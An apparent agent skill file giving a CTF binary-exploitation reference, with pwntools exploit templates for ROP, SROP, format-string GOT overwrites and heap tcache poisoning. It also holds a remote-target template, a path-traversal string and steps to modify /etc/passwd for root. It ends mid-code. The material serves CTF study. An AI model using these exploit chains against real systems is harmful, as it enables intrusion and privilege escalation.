---
name: ctf-pwn
description: Binary exploitation (pwn) techniques for CTF challenges. Use when exploiting buffer overflows, format strings, heap vulnerabilities, race conditions, kernel bugs, ROP chains, ret2libc, shellcode, GOT overwrite, use-after-free, seccomp bypass, FSOP, stack pivot, or sandbox escape.
license: MIT
compatibility: Requires filesystem-based agent (Claude Code or similar) with bash, Python 3, and internet access for tool installation.
allowed-tools: Bash Read Write Edit Glob Grep Task WebFetch WebSearch
metadata:
  user-invocable: "false"
---

# CTF Binary Exploitation (Pwn)

Quick reference for binary exploitation (pwn) CTF challenges. Each technique has a one-liner here; see supporting files for full details.

## Additional Resources

- [solve_pwn.py](solve_pwn.py) - Auto route selection (`--input-json`) + benchmark mode (`--benchmark-mode`)
- [PWN_BENCHMARK_CASES.json](PWN_BENCHMARK_CASES.json) - Routing benchmark set for pwn tracks
- [challenge_artifacts.pwn.template.json](challenge_artifacts.pwn.template.json) - Copy-run artifact template for immediate routing
- [PWN_SHELL_CONTROL_PLAYBOOK.md](PWN_SHELL_CONTROL_PLAYBOOK.md) - Hybrid MCP + persistent exploit loop reliability playbook
- [overflow-basics.md](overflow-basics.md) - Stack/global buffer overflow, ret2win, canary bypass, struct pointer overwrite, signed integer bypass, hidden gadgets
- [rop-and-shellcode.md](rop-and-shellcode.md) - ROP chains (ret2libc, syscall ROP), shellcode with input reversal, seccomp bypass, .fini_array hijack, pwntools template
- [format-string.md](format-string.md) - Format string exploitation (leaks, GOT overwrite, blind pwn, filter bypass, canary leak, __free_hook, .rela.plt patching)
- [advanced.md](advanced.md) - Heap, UAF, JIT, esoteric GOT, custom allocators, DNS overflow, MD5 preimage, ASAN, rdx control, canary-aware overflow, CSV injection, path traversal, kernel
- [heap-fsop.md](heap-fsop.md) - Upstream FILE-structure (FSOP) heap patterns
- [heap-techniques.md](heap-techniques.md) - Upstream heap exploitation reference
- [heap-techniques-2.md](heap-techniques-2.md) - Upstream advanced heap follow-up patterns
- [sandbox-escape.md](sandbox-escape.md) - Python sandbox escape, custom VM exploitation, FUSE/CUSE devices, busybox/restricted shell, shell tricks

---

## Router & Benchmark (Fast Triage)

```bash
# Route from artifact JSON
python3 solve_pwn.py --input-json challenge_artifacts.pwn.template.json --json

# Benchmark routing quality
python3 solve_pwn.py --benchmark-mode --json

# CI/checklist strict mode
python3 solve_pwn.py --benchmark-mode --strict-benchmark --pass-threshold 0.95 --json
```

Core tracks:
- `bof-ret2win`
- `ret2libc`
- `format-string`
- `heap-uaf`
- `srop-syscall`
- `seccomp-bypass`
- `race-condition`
- `blind-remote-pwn`
- `kernel-pwn`
- `sandbox-escape`

## MCP Priority (Pwn Hybrid Policy)

- Start with `[MCP: ctf-solve]` for triage (`checksec`, quick parse, static clues)
- Switch to `[MCP: pentest-mcp]` when exploit becomes continuous/interactive
- Keep `[MCP: pentest-mcp]` through stateful retry loops and shell stabilization
- Use `[MCP: ctf-reverse]` as supplemental for custom VM/kernel internals

Do NOT use all MCPs simultaneously. Use evidence-triggered routing.

## Speed + Continuity Rules (Exploit Loop)

1. Keep stage-1 leak and stage-2 exec chain separated
2. Use deterministic `recvuntil()` anchors before each send
3. Keep retry-safe timeout handling for remote blind pwn
4. If exact same error repeats 3 times, pivot vector immediately
5. Always verify shell/result before claiming success

Detailed runbook: [PWN_SHELL_CONTROL_PLAYBOOK.md](PWN_SHELL_CONTROL_PLAYBOOK.md)

## External Best-Practice Anchors

- Pwntools tubes documentation (session/recv/send reliability)
- one_gadget usage and constraints workflow
- pwndbg command index (`vmmap`, `telescope`, `canary`, `xinfo`)

---

## Source Code Red Flags

- Threading/`pthread` -> race conditions
- `usleep()`/`sleep()` -> timing windows
- Global variables in multiple threads -> TOCTOU

## Race Condition Exploitation

```bash
bash -c '{ echo "cmd1"; echo "cmd2"; sleep 1; } | nc host port'
```

## Common Vulnerabilities

- Buffer overflow: `gets()`, `scanf("%s")`, `strcpy()`
- Format string: `printf(user_input)`
- Integer overflow, UAF, race conditions

## Protection Implications for Exploit Strategy

| Protection | Status | Implication |
|-----------|--------|-------------|
| PIE | Disabled | All addresses (GOT, PLT, functions) are fixed - direct overwrites work |
| RELRO | Partial | GOT is writable - GOT overwrite attacks possible |
| RELRO | Full | GOT is read-only - need alternative targets (hooks, vtables, return addr) |
| NX | Enabled | Can't execute shellcode on stack/heap - use ROP or ret2win |
| Canary | Present | Stack smash detected - need leak or avoid stack overflow (use heap) |

**Quick decision tree:**
- Partial RELRO + No PIE -> GOT overwrite (easiest, use fixed addresses)
- Full RELRO -> target `__free_hook`, `__malloc_hook` (glibc < 2.34), or return addresses
- Stack canary present -> prefer heap-based attacks or leak canary first

## Stack Buffer Overflow

1. Find offset: `cyclic 200` then `cyclic -l <value>`
2. Check protections: `checksec --file=binary`
3. No PIE + No canary = direct ROP
4. Canary leak via format string or partial overwrite

**ret2win with magic value:** Overflow -> `ret` (alignment) -> `pop rdi; ret` -> magic -> win(). See [overflow-basics.md](overflow-basics.md) for full exploit code.

**Stack alignment:** Modern glibc needs 16-byte alignment; SIGSEGV in `movaps` = add extra `ret` gadget. See [overflow-basics.md](overflow-basics.md).

**Offset calculation:** Buffer at `rbp - N`, return at `rbp + 8`, total = N + 8. See [overflow-basics.md](overflow-basics.md).

**Input filtering:** `memmem()` checks block certain byte sequences; assert payload doesn't contain banned strings. See [overflow-basics.md](overflow-basics.md).

**Finding gadgets:** `ROPgadget --binary binary | grep "pop rdi"`, or use pwntools `ROP()` which also finds hidden gadgets in CMP immediates. See [overflow-basics.md](overflow-basics.md).

## Struct Pointer Overwrite (Heap Menu Challenges)

**Pattern:** Menu create/modify/delete on structs with data buffer + pointer. Overflow name into pointer field with GOT address, then write win address via modify. See [overflow-basics.md](overflow-basics.md) for full exploit and GOT target selection table.

## Signed Integer Bypass

**Pattern:** `scanf("%d")` without sign check; negative quantity * price = negative total, bypasses balance check. See [overflow-basics.md](overflow-basics.md).

## Canary-Aware Partial Overflow

**Pattern:** Overflow `valid` flag between buffer and canary. Use `./` as no-op path padding for precise length. See [overflow-basics.md](overflow-basics.md) and [advanced.md](advanced.md) for full exploit chain.

## Global Buffer Overflow (CSV Injection)

**Pattern:** Adjacent global variables; overflow via extra CSV delimiters changes filename pointer. See [overflow-basics.md](overflow-basics.md) and [advanced.md](advanced.md) for full exploit.

## ROP Chain Building

Leak libc via `puts@PLT(puts@GOT)`, return to vuln, stage 2 with `system("/bin/sh")`. See [rop-and-shellcode.md](rop-and-shellcode.md) for full two-stage ret2libc pattern, leak parsing, and return target selection.

### 🚨 PAYLOAD SIZE OPTIMIZATION (Critical Blind Spot #4)

**If buffer overflow size is strictly limited (e.g., < 40 bytes), pivot to `one_gadget` instead of full ROP chain:**

```bash
# Find one_gadget constraints
one_gadget libc.so.6

# Output:
# 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL
#
# 0x4f322 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL
#
# 0x10a38c execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
```

**Usage:**
```python
# Standard ROP chain (requires ~48 bytes)
payload = flat({
    offset: [
        ret,           # 8 bytes
        pop_rdi,       # 8 bytes
        binsh_addr,    # 8 bytes
        system_addr    # 8 bytes
    ]
})  # Total: offset + 32 bytes

# ✅ one_gadget optimization (requires only ~16 bytes)
one_gadget = libc_base + 0x4f322
payload = flat({
    offset: [
        ret,           # 8 bytes (for alignment)
        one_gadget     # 8 bytes
    ]
})  # Total: offset + 16 bytes (50% smaller!)

# Verify constraints before using
# If constraints not met, try different one_gadget offset
```

**CRITICAL RULES:**
1. ✅ **ALWAYS try one_gadget first if payload size < 40 bytes**
2. ✅ **ALWAYS check constraints with GDB** before assuming it works
3. ✅ **ALWAYS try all 3-4 one_gadget offsets** (different constraints)
4. ❌ **NEVER assume one_gadget will work** (constraints often fail)

**Constraint Debugging:**
```python
# If one_gadget fails, debug constraints
io = gdb.debug(elf.path, gdbscript='''
b *main+123
c
x/20gx $rsp
info registers rcx
''')
# Check if rsp is 16-byte aligned
# Check if rcx is NULL
# Check if [rsp+0x40] is NULL
```

---

**Raw syscall ROP:** When `system()`/`execve()` crash (CET/IBT), use `pop rax; ret` + `syscall; ret` from libc. See [rop-and-shellcode.md](rop-and-shellcode.md).

### 🚨 SROP PROTOCOL (Sigreturn Oriented Programming Failsafe)

**When to use:** If standard ROP gadgets are scarce (cannot find `pop rdi`, `pop rsi`, etc.) but `syscall` gadget is available AND you can control `rax` register (usually via the length of bytes read in `read()` call).

**SROP allows you to set ALL registers at once using a single gadget.**

```python
from pwn import *

# Scenario: Binary has syscall gadget but no other useful gadgets
# We can control rax via read() return value

# Step 1: Find syscall gadget
syscall_gadget = 0x401234  # Example address

# Step 2: Create SigreturnFrame
frame = SigreturnFrame()
frame.rax = 59              # execve syscall number
frame.rdi = bss_addr        # pointer to "/bin/sh" (we'll write it first)
frame.rsi = 0               # argv = NULL
frame.rdx = 0               # envp = NULL
frame.rip = syscall_gadget  # return to syscall after sigreturn

# Step 3: Build exploit
# Stage 1: Write "/bin/sh" to .bss
payload1 = flat({
    offset: [
        pop_rax,        # Set rax = 15 (sys_rt_sigreturn)
        15,
        syscall_gadget  # Trigger sigreturn
    ]
})
payload1 += bytes(frame)  # Append sigreturn frame

io.sendline(payload1)
io.sendline(b'/bin/sh\x00')  # Write /bin/sh to .bss

# Result: All registers set via SROP → execve("/bin/sh", NULL, NULL)
io.interactive()
```

**CRITICAL RULES:**
1. ✅ **ALWAYS use SROP when gadgets are scarce** (< 3 useful gadgets)
2. ✅ **ALWAYS control rax = 15** (sys_rt_sigreturn syscall number)
3. ✅ **ALWAYS set frame.rip to syscall gadget** (to execute final syscall)
4. ✅ **ALWAYS write "/bin/sh" to writable memory first** (.bss, .data, or stack)
5. ❌ **NEVER forget to set frame.rax to target syscall** (59 for execve)

**Why SROP is powerful:**
- Only needs 1 gadget: `syscall; ret`
- Can set all 16 registers in one payload
- Bypasses lack of `pop rdi`, `pop rsi`, `pop rdx` gadgets
- Works even with minimal ROP gadget availability

**Common SROP syscalls:**
```python
# execve("/bin/sh", NULL, NULL)
frame.rax = 59
frame.rdi = binsh_addr
frame.rsi = 0
frame.rdx = 0

# open("flag.txt", O_RDONLY)
frame.rax = 2
frame.rdi = flag_path_addr
frame.rsi = 0  # O_RDONLY
frame.rdx = 0

# read(fd, buf, count)
frame.rax = 0
frame.rdi = 3  # fd from open()
frame.rsi = buf_addr
frame.rdx = 100

# write(1, buf, count)
frame.rax = 1
frame.rdi = 1  # stdout
frame.rsi = buf_addr
frame.rdx = 100
```

---

**rdx control:** After `puts()`, rdx is clobbered to 1. Use `pop rdx; pop rbx; ret` from libc, or re-enter binary's read setup + stack pivot. See [rop-and-shellcode.md](rop-and-shellcode.md).

**Shell interaction:** After `execve`, `sleep(1)` then `sendline(b'cat /flag*')`. See [rop-and-shellcode.md](rop-and-shellcode.md).

## Use-After-Free (UAF) Exploitation

**Pattern:** Menu create/delete/view where `free()` doesn't NULL pointer. Create -> leak -> free -> allocate same-size object to overwrite function pointer -> trigger callback. Key: both structs must be same size for tcache reuse.

**CRITICAL:** This is a **HEAP** vulnerability, not stack. If decompilation shows `malloc()`/`free()`, follow the **HEAP EXPLOITATION DECISION TREE** above, NOT the stack overflow workflow.

See [advanced.md](advanced.md) for full exploit code.

## Seccomp Bypass

Alternative syscalls when seccomp blocks `open()`/`read()`: `openat()` (257), `openat2()` (437, often missed!), `sendfile()` (40), `readv()`/`writev()`, `mmap()` (9, map flag file into memory instead of read), `pread64()` (17).

**Check rules:** `seccomp-tools dump ./binary`

See [rop-and-shellcode.md](rop-and-shellcode.md) for quick reference and [advanced.md](advanced.md) for conditional buffer address restrictions, shellcode without relocations, `scmp_arg_cmp` struct layout.

## Stack Shellcode with Input Reversal

**Pattern:** Binary reverses input buffer. Pre-reverse shellcode, use partial 6-byte RIP overwrite, trampoline `jmp short` to NOP sled. See [rop-and-shellcode.md](rop-and-shellcode.md).

## .fini_array Hijack

Writable `.fini_array` + arbitrary write -> overwrite with win/shellcode address. Works even with Full RELRO. See [rop-and-shellcode.md](rop-and-shellcode.md) for implementation.

## Path Traversal Sanitizer Bypass

**Pattern:** Sanitizer skips char after banned char match; double chars to bypass (e.g., `....//....//etc//passwd`). Also try `/proc/self/fd/3` if binary has flag fd open. See [advanced.md](advanced.md).

## Kernel Exploitation

OOB via vulnerable `lseek`, heap grooming with `fork()`, SUID exploits. Check `CONFIG_SLAB_FREELIST_RANDOM` and `CONFIG_SLAB_MERGE_DEFAULT`. See [advanced.md](advanced.md).

## Format String Quick Reference

- Leak stack: `%p.%p.%p.%p.%p.%p` | Leak specific: `%7$p`
- Write: `%n` (4-byte), `%hn` (2-byte), `%hhn` (1-byte), `%lln` (8-byte full 64-bit)
- GOT overwrite for code execution (Partial RELRO required)

### 🚨 FORMAT STRING AUTOMATION (Critical Blind Spot #4)

**DO NOT write manual padding for `%n` writes. ALWAYS use pwntools automation:**

```python
# ❌ WRONG: Manual padding (error-prone, time-wasting)
payload = b'%134514016c%10$n' + b'AAAA' + p64(elf.got['puts'])
# This is fragile and breaks easily

# ✅ CORRECT: pwntools fmtstr_payload (automatic, reliable)
from pwn import *

# Step 1: Find format string offset
# Send: AAAA.%p.%p.%p.%p.%p.%p
# Find which %p shows 0x4141414141414141
offset = 6  # Example: 6th argument

# Step 2: Automated GOT overwrite
writes = {
    elf.got['puts']: elf.symbols['win'],
    elf.got['printf']: elf.symbols['system']
}
payload = fmtstr_payload(offset, writes)
io.sendline(payload)

# Step 3: Trigger overwritten function
io.sendline(b'/bin/sh')  # Calls system('/bin/sh') via overwritten printf
```

**Advanced: Arbitrary write with fmtstr_payload**
```python
# Write shellcode address to return address on stack
stack_ret_addr = leaked_stack + 0x38
shellcode_addr = leaked_stack + 0x100

writes = {stack_ret_addr: shellcode_addr}
payload = fmtstr_payload(offset, writes, write_size='short')  # Use %hn for 2-byte writes
io.sendline(payload)
```

**WHY THIS MATTERS:**
- ✅ Automatic padding calculation (no manual math)
- ✅ Handles multiple writes in single payload
- ✅ Supports different write sizes (`byte`, `short`, `int`)
- ✅ Works with any offset (no hardcoding)
- ✅ Saves 10+ minutes per format string challenge

See [format-string.md](format-string.md) for GOT overwrite patterns, blind pwn, filter bypass, canary+PIE leak, `__free_hook` overwrite, and argument retargeting.

## .rela.plt / .dynsym Patching (Format String)

**When to use:** GOT addresses contain bad bytes (e.g., 0x0a). Patch `.rela.plt` symbol index + `.dynsym` st_value to redirect function resolution to `win()`. Bypasses all GOT byte restrictions. See [format-string.md](format-string.md) for full technique and code.

## Heap Exploitation

- tcache poisoning (glibc 2.26+), fastbin dup / double free
- House of Force (old glibc), unsorted bin attack
- **House of Apple 2** (glibc 2.34+): FSOP via `_IO_wfile_jumps` when `__free_hook`/`__malloc_hook` removed. Fake FILE with `_flags = " sh"`, vtable chain → `system(fp)`.
- **House of Einherjar**: Off-by-one null clears PREV_INUSE, backward consolidation with self-pointing unlink.
- **Safe-linking** (glibc 2.32+): tcache fd mangled as `ptr ^ (chunk_addr >> 12)`.
- Check glibc version: `strings libc.so.6 | grep GLIBC`
- Freed chunks contain libc pointers (fd/bk) -> leak via error messages or missing null-termination
- Heap feng shui: control alloc order/sizes, create holes, place targets adjacent to overflow source

See [advanced.md](advanced.md) for House of Apple 2 FSOP chain, custom allocator exploitation (nginx pools), heap overlap via base conversion, tree data structure stack underallocation, FSOP + seccomp bypass via openat/mmap/write with `mov rsp, rdx` stack pivot.

## JIT Compilation Exploits

**Pattern:** Off-by-one in instruction encoding -> misaligned machine code. Embed shellcode as operand bytes of subtraction operations, chain with 2-byte `jmp` instructions. See [advanced.md](advanced.md).

**BF JIT unbalanced bracket:** Unbalanced `]` pops tape address (RWX) from stack → write shellcode to tape with `+`/`-`, trigger `]` to jump to it. See [advanced.md](advanced.md).

## Type Confusion in Interpreters

**Pattern:** Interpreter sets wrong type tag → struct fields reinterpreted. Unused padding bytes in one variant become active pointers/data in another. Flag bytes as type value trigger UNKNOWN_DATA dump. See [advanced.md](advanced.md).

## Off-by-One Index / Size Corruption

**Pattern:** Array index 0 maps to `entries[-1]`, overlapping struct metadata (size field). Corrupted size → OOB read leaks canary/libc, then OOB write places ROP chain. See [advanced.md](advanced.md).

## Double win() Call

**Pattern:** `win()` checks `if (attempts++ > 0)` — needs two calls. Stack two return addresses: `p64(win) + p64(win)`. See [advanced.md](advanced.md).

## Esoteric Language GOT Overwrite

**Pattern:** Brainfuck/Pikalang interpreter with unbounded tape = arbitrary read/write relative to buffer base. Move pointer to GOT, overwrite byte-by-byte with `system()`. See [advanced.md](advanced.md).

## DNS Record Buffer Overflow

**Pattern:** Many AAAA records overflow stack buffer in DNS response parser. Set up DNS server with excessive records, overwrite return address. See [advanced.md](advanced.md).

## ASAN Shadow Memory Exploitation

**Pattern:** Binary with AddressSanitizer has format string + OOB write. ASAN may use "fake stack" (50% chance). Leak PIE, detect real vs fake stack, calculate OOB write offset to overwrite return address. See [advanced.md](advanced.md).

## Format String with RWX .fini_array Hijack

**Pattern (Encodinator):** Base85-encoded input in RWX memory passed to `printf()`. Write shellcode to RWX region, overwrite `.fini_array[0]` via format string `%hn` writes. Use convergence loop for base85 argument numbering. See [advanced.md](advanced.md).

## Custom Canary Preservation

**Pattern:** Buffer overflow must preserve known canary value. Write exact canary bytes at correct offset: `b'A' * 64 + b'BIRD' + b'X'`. See [advanced.md](advanced.md).

## MD5 Preimage Gadget Construction

**Pattern (Hashchain):** Brute-force MD5 preimages with `eb 0c` prefix (jmp +12) to skip middle bytes; bytes 14-15 become 2-byte i386 instructions. Build syscall chains from gadgets like `31c0` (xor eax), `cd80` (int 0x80). See [advanced.md](advanced.md) for C code and v2 technique.

## Python Sandbox Escape

AST bypass via f-strings, audit hook bypass with `b'flag.txt'` (bytes vs str), MRO-based `__builtins__` recovery. See [sandbox-escape.md](sandbox-escape.md).

## VM GC-Triggered UAF (Slab Reuse)

**Pattern:** Custom VM with NEWBUF/SLICE/GC opcodes. Slicing creates shared slab reference; dropping+GC'ing slice frees slab while parent still holds it. Allocate function object to reuse slab, leak code pointer via UAF read, overwrite with win() address. See [advanced.md](advanced.md).

## VM Exploitation (Custom Bytecode)

**Pattern:** Custom VM with OOB read/write in syscalls. Leak PIE via XOR-encoded function pointer, overflow to rewrite pointer with `win() ^ KEY`. See [sandbox-escape.md](sandbox-escape.md).

## FUSE/CUSE Character Device Exploitation

Look for `cuse_lowlevel_main()` / `fuse_main()`, backdoor write handlers with command parsing. Exploit to `chmod /etc/passwd` then modify for root access. See [sandbox-escape.md](sandbox-escape.md).

## Busybox/Restricted Shell Escalation

Find writable paths via character devices, target `/etc/passwd` or `/etc/sudoers`, modify permissions then content. See [sandbox-escape.md](sandbox-escape.md).

## Shell Tricks

`exec<&3;sh>&3` for fd redirection, `$0` instead of `sh`, `ls -la /proc/self/fd` to find correct fd. See [sandbox-escape.md](sandbox-escape.md).

## Useful Commands

`checksec`, `one_gadget`, `ropper`, `ROPgadget`, `seccomp-tools dump`, `strings libc | grep GLIBC`. See [rop-and-shellcode.md](rop-and-shellcode.md) for full command list and pwntools template.


---

# [Appended from ctf-arsenal: pwn-exploits]

# Binary Exploitation Patterns

## When to Use

Load this skill when:
- Solving binary exploitation (pwn) CTF challenges
- Working with buffer overflows and stack-based vulnerabilities
- Building ROP (Return-Oriented Programming) chains
- Writing shellcode or exploits
- Using pwntools for exploitation
- Analyzing binaries with GDB, checksec, or strings

## Binary Analysis Workflow

### 🚨 Step 0.5: Environment Matching (CRITICAL - MANDATORY)

**BEFORE ANY LOCAL TESTING, if the challenge provides `libc.so.6` or `ld-linux.so.2`, you MUST patch the binary to use the provided libraries.**

**WHY:** Local testing with Kali's default libc (e.g., 2.36) while remote uses 2.27 will cause:
- ❌ Different function offsets → exploit fails remotely
- ❌ Different memory layout → GDB debugging is useless
- ❌ Different gadget addresses → ROP chain crashes
- ❌ Wasted time debugging wrong environment

**MANDATORY PROTOCOL:**

```bash
# Check if libc.so.6 is provided
ls -la | grep -E "libc|ld-linux"

# If libc.so.6 exists → MUST use pwninit or patchelf
# Option A: pwninit (RECOMMENDED - automatic)
pwninit --bin vuln --libc libc.so.6 --ld ld-linux-x86-64.so.2
# Generates: vuln_patched, solve.py template

# Option B: patchelf (manual)
patchelf --set-interpreter ./ld-linux-x86-64.so.2 vuln
patchelf --set-rpath . vuln
patchelf --replace-needed libc.so.6 ./libc.so.6 vuln
mv vuln vuln_patched

# Verify patching
ldd ./vuln_patched
# Expected output:
#   linux-vdso.so.1 (0x00007ffff7ffa000)
#   libc.so.6 => ./libc.so.6 (0x00007ffff7c00000)  ← MUST point to local file
#   ./ld-linux-x86-64.so.2 (0x00007ffff7dd5000)
```

**CRITICAL RULES:**
1. ✅ **ALWAYS use `./vuln_patched` for local testing** (NOT `./vuln`)
2. ✅ **ALWAYS load `libc = ELF('./libc.so.6')` in pwntools** (NOT `elf.libc`)
3. ✅ **ALWAYS verify with `ldd ./vuln_patched`** before writing exploit
4. ❌ **NEVER skip this step** even if "local works without it"

**If no libc.so.6 provided:**
```bash
# Extract remote libc version via leak
# Then download matching libc from:
# - https://libc.rip/
# - https://libc.blukat.me/
# Then apply pwninit with downloaded libc
```

---

### Step 1: Static Analysis First

**Always begin with static analysis before dynamic exploitation.**

```bash
# Search for interesting strings
strings ./vuln | grep -iE "flag|password|key|secret|admin"

# Check binary protections
checksec ./vuln

# Examine file type and architecture
file ./vuln
```

**Why?** Static analysis reveals:
- Hidden functionality and backdoor functions
- Hardcoded credentials or flags
- Security mitigations (PIE, NX, Stack Canary, RELRO)
- Architecture (32-bit vs 64-bit, calling conventions)

### Step 2: Decompile with Ghidra/IDA

```bash
# Batch decompile with Ghidra headless mode (RECOMMENDED)
./ghidra_headless/decompile_headless.sh ./vuln output.c

# Or use Python wrapper (legacy)
python tools/decompile.py ./vuln

# Or manually open in Ghidra GUI
ghidra
```

**Key things to look for:**
- Dangerous functions: `gets()`, `strcpy()`, `scanf()`, `read()` with no bounds
- Win functions: `system("/bin/sh")`, `execve()`, `print_flag()`
- Buffer sizes vs input sizes
- Comparison operations (password checks, admin checks)
- **🚨 HEAP INDICATORS (Critical Blind Spot #3):**
  - `malloc()`, `free()`, `calloc()`, `realloc()` calls
  - Menu-driven interface (1. Add, 2. Delete, 3. View, 4. Edit)
  - Struct with function pointers or size fields
  - Global pointer arrays (e.g., `void *chunks[10]`)

### 🚨 HEAP EXPLOITATION DECISION TREE (MANDATORY)

**IF decompilation shows `malloc()` + `free()` + menu interface → SWITCH TO HEAP PROTOCOL:**

```bash
# Step 1: Check glibc version (CRITICAL for heap techniques)
strings libc.so.6 | grep "GLIBC_"
# or
./libc.so.6
# Output: GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1) stable release version 2.27
```

**Heap Technique Decision Table:**

| glibc Version | Available Techniques | Blocked Techniques |
|---------------|---------------------|--------------------|
| **2.23-2.25** | Fastbin dup, House of Force, Unsorted bin attack | tcache (doesn't exist) |
| **2.26-2.31** | tcache poisoning (easy), fastbin dup, UAF | Safe-linking (not yet) |
| **2.32+** | tcache poisoning (hard - safe-linking), House of Apple 2 | Easy tcache, `__free_hook`/`__malloc_hook` (removed in 2.34+) |

**HEAP QUICK WINS (Phase 1 - Check These First):**

```python
# 1. Use-After-Free (UAF) Detection
# Pattern: free() doesn't set pointer to NULL
# Decompiled code:
def delete_note(idx):
    free(notes[idx])
    # ❌ Missing: notes[idx] = NULL

# Exploit: Create → Free → Allocate same size → Overwrite function pointer
# See advanced.md for full UAF exploitation

# 2. Double Free Detection
# Pattern: Can free same chunk twice
def delete_note(idx):
    free(notes[idx])
    # ❌ Missing: notes[idx] = NULL or freed flag check

# Exploit: free(A) → free(B) → free(A) → tcache/fastbin corruption

# 3. Heap Overflow Detection
# Pattern: strcpy/read into heap buffer without bounds check
def edit_note(idx, data):
    strcpy(notes[idx]->data, data)  # ❌ No size check

# Exploit: Overflow into next chunk's metadata (size, fd, bk)
```

**HEAP EXPLOITATION WORKFLOW:**

```python
# Step 1: Leak libc address (via unsorted bin or tcache)
# Create large chunk (> 0x410 bytes) → free → view → leak fd pointer
create(0, 0x500, b'A'*8)
delete(0)
leak = view(0)  # Reads freed chunk's fd (points to main_arena)
libc_base = leak - libc.symbols['main_arena'] - 96

# Step 2: Tcache poisoning (glibc 2.26-2.31)
# Allocate → Free → UAF write → Overwrite fd → Allocate target address
create(0, 0x40, b'A'*8)
create(1, 0x40, b'B'*8)
delete(0)
delete(1)
# UAF: overwrite chunk 1's fd with target address
edit(1, p64(__free_hook_addr))  # fd = __free_hook
create(2, 0x40, b'/bin/sh\x00')  # Allocate from tcache
create(3, 0x40, p64(system_addr))  # Allocate __free_hook, write system
delete(2)  # Triggers free("/bin/sh") → system("/bin/sh")

# Step 3: Safe-linking bypass (glibc 2.32+)
# fd is mangled: fd_real = fd_stored ^ (chunk_addr >> 12)
heap_base = leak_heap_address()  # Need heap leak first
target = __free_hook_addr
mangled_fd = target ^ (heap_base >> 12)
edit(1, p64(mangled_fd))
```

**CRITICAL HEAP RULES:**
1. ✅ **ALWAYS check glibc version first** (techniques vary wildly)
2. ✅ **ALWAYS check for UAF before trying overflow** (easier to exploit)
3. ✅ **ALWAYS leak heap address for safe-linking bypass** (glibc 2.32+)
4. ✅ **ALWAYS use same-size chunks for tcache reuse** (size must match exactly)
5. ❌ **NEVER assume `__free_hook` exists** (removed in glibc 2.34+, use House of Apple 2)

**If stuck on heap, see [advanced.md](advanced.md) for:**
- House of Apple 2 (glibc 2.34+ FSOP)
- House of Einherjar (off-by-one null byte)
- Heap feng shui (allocation order manipulation)
- Custom allocator exploitation

### Protection Analysis Table

| Protection | Status | Exploitation Strategy |
|------------|--------|----------------------|
| **PIE** | Enabled | Need address leak for code/data addresses |
| **PIE** | Disabled | Can use hardcoded addresses directly |
| **NX** | Enabled | Cannot execute shellcode on stack, use ROP |
| **NX** | Disabled | Can write shellcode to buffer and execute |
| **Stack Canary** | Enabled | Need canary leak or bypass technique |
| **Stack Canary** | Disabled | Direct buffer overflow exploitation |
| **RELRO Full** | Enabled | Cannot overwrite GOT entries |
| **RELRO Partial** | Enabled | Can overwrite GOT for hijacking |

## Exploitation Patterns

### 🚨 MANDATORY BOILERPLATE (Critical Blind Spot #2)

**EVERY pwntools script MUST use this standard template for Local/Remote/GDB switching:**

```python
#!/usr/bin/env python3
from pwn import *
import os

# Binary setup (auto-detect patched version)
elf = context.binary = ELF('./vuln_patched' if os.path.exists('./vuln_patched') else './vuln')

# Libc setup (CRITICAL: use provided libc if exists)
if os.path.exists('./libc.so.6'):
    libc = ELF('./libc.so.6')
else:
    libc = elf.libc  # Fallback to system libc

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

def start():
    """Start the exploit in LOCAL, REMOTE, or GDB mode"""
    if args.REMOTE:
        # Usage: python solve.py REMOTE <host> <port>
        host = args.HOST or '10.10.50.100'
        port = int(args.PORT or 1337)
        return remote(host, port)
    
    elif args.GDB:
        # Usage: python solve.py GDB
        # 🚨 GDB BEST PRACTICE: Do NOT just break at main
        # ALWAYS break at the vulnerable instruction or immediately after vulnerable call
        # Examples:
        #   - Break at ret of vulnerable function: b *vuln+72
        #   - Break after gets()/read(): b *vuln+45
        #   - Break at overflow point: b *0x401234
        gdbscript = '''
        b *main
        continue
        # TODO: Replace 'b *main' with actual vulnerable instruction
        # Example: b *vuln+72  (ret instruction of vulnerable function)
        # Example: b *0x401234 (right after gets() call)
        '''.format(**locals())
        return gdb.debug(elf.path, gdbscript=gdbscript)
    
    else:
        # Usage: python solve.py (local mode)
        return process(elf.path)

# Start exploit
io = start()

# Example: Find offset
if args.FIND_OFFSET:
    payload = cyclic(500)
    io.sendline(payload)
    io.wait()
    core = Coredump('./core')
    offset = cyclic_find(core.read(core.rsp, 4))  # x64
    log.success(f"Offset: {offset}")
    exit()

# Your exploit code here
# ...

io.interactive()
```

**Usage Examples:**
```bash
# Local testing (uses vuln_patched + local libc.so.6)
python solve.py

# Find offset
python solve.py FIND_OFFSET

# GDB debugging
python solve.py GDB

# Remote exploitation
python solve.py REMOTE 10.10.50.100 1337
# or with args
python solve.py REMOTE HOST=target.com PORT=9999
```

**WHY THIS MATTERS:**
- ✅ Single script works for local testing AND remote exploitation
- ✅ Automatically uses patched binary if exists
- ✅ Automatically uses provided libc.so.6
- ✅ No code changes needed when switching modes
- ✅ Prevents "works locally but fails remotely" disasters

---

### Pattern 1: Find Buffer Overflow Offset

**NOTE: Use the boilerplate above instead of this basic pattern.**

```python
# Legacy pattern (DO NOT USE - missing environment matching)
from pwn import *

io = process('./vuln')  # ❌ WRONG - should use start() function
payload = cyclic(500)
io.sendline(payload)
io.wait()

core = Coredump('./core')
offset = cyclic_find(core.read(core.rsp, 4))  # x86_64
log.info(f"Offset: {offset}")
```

**Alternative: Manual offset finding**

```python
# Use offset_finder.py from tools/
# python tools/offset_finder.py ./vuln
```

### Pattern 2: Basic ret2win (Call Win Function)

```python
from pwn import *

exe = "./vuln"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "debug"

# Find win function address
win_addr = elf.symbols['win']  # or elf.symbols['print_flag']

# Build payload
payload = flat({
    offset: [
        win_addr
    ]
})

io = process(exe)
io.sendline(payload)
io.interactive()
```

### Pattern 3: ret2libc (Leak + System)

**Stage 1: Leak libc address**

```python
from pwn import *

exe = "./vuln"
elf = context.binary = ELF(exe, checksec=False)
libc = ELF("./libc.so.6")  # or ELF("/lib/x86_64-linux-gnu/libc.so.6")
rop = ROP(elf)

